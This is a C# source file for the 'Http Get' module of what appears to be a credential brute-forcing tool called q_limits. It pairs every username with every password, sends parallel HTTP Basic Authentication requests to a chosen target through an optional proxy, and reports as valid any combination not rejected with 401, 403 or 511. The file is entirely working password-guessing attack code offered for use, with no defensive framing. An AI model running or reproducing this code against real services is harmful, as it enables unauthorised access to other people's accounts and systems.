using Spectre.Console;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Melodi.Networking;

namespace q_limits.Modules
{
    public class HttpGetModule : IModule
    {
        private static List<string> authGood;

        static HttpGetModule()
        {
            authGood = new();
            for (int i = 100; i < 103 + 1; i++)
            {
                authGood.Add(i.ToString());
            }
            for (int i = 200; i < 226; i++)
            {
                authGood.Add(i.ToString());
            }
            for (int i = 300; i < 308 + 1; i++)
            {
                authGood.Add(i.ToString());
            }
            for (int i = 400; i < 451 + 1; i++)
            {
                if (i == 401) continue;
                if (i == 403) continue;

                authGood.Add(i.ToString());
            }
            for (int i = 500; i < 511 + 1; i++)
            {
                if (i == 511) continue;
                authGood.Add(i.ToString());
            }
        }
        public HttpGetModule()
        {
            Name = "Http Get";
            ID = "http-get";
        }
        public override void Load(CommandLineOptions options, CredentialContext credContext, ProgressContext progCtx)
        {
            WebProxy proxy = null;
            if (ProxyManager.ProxyRequired)
            {
                AnsiConsole.MarkupLine("[gray]Proxy detected[/]");
                if (options.Proxy != null)
                {
                    string[] splt = options.Proxy.Split(":", 2);
                    string username = splt[0];
                    string password = splt.Length > 1 ? splt[1] : "";

                    try
                    {
                        proxy = ProxyManager.GetWebProxy(new(username, password));
                    }
                    catch (Exception)
                    {
                        AnsiConsole.MarkupLine("[red]Proxy connect failed[/]");
                        return;
                    }
                }
                else
                {
                    try
                    {
                        proxy = ProxyManager.GetWebProxy();
                    }
                    catch (Exception)
                    {
                        AnsiConsole.MarkupLine("[red]Proxy connect failed[/]");
                        return;
                    }
                }
            }

            var buildTask = progCtx.AddTask("[gray][[Module]][/] Building list into mem", true, credContext.Combinations);
            List<Credential> possibilities = new();

            foreach (var username in credContext.Usernames)
            {
                foreach (var password in credContext.Passwords)
                {
                    possibilities.Add(new(username, password));
                    buildTask.Increment(1);
                }
            }

            buildTask.Value = buildTask.MaxValue;
            var mainTask = progCtx.AddTask("[gray][[Module]][/] Breaking limits", true, possibilities.Count);
            ParallelExecutor.ForEachAsync(options.MaxThreadCount, possibilities, x => 
            {
                try
                {
                    WebRequest web = WebRequest.Create(options.Destination);
                    web.Proxy = proxy;

                    string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes(x.Key + ":" + x.Value));

                    web.Headers[HttpRequestHeader.Authorization] = "Basic " + credentials;
                    web.Credentials = new NetworkCredential(x.Key, x.Value);

                    web.GetResponse();

                    ModuleService.ReportSuccess(options.Destination, x);
                }
                catch (Exception e) 
                {
                    //string[] authBad = { "401", "403" };

                    if (authGood.Any(y => e.Message.Contains("(" + y + ")")))
                    {
                        ModuleService.ReportSuccess(options.Destination, x);
                    }
                }

                lock (mainTask)
                {
                    mainTask.Increment(1);
                }
                return Task.CompletedTask;
            }).GetAwaiter().GetResult();

            mainTask.Value = mainTask.MaxValue;
        }
    }
}
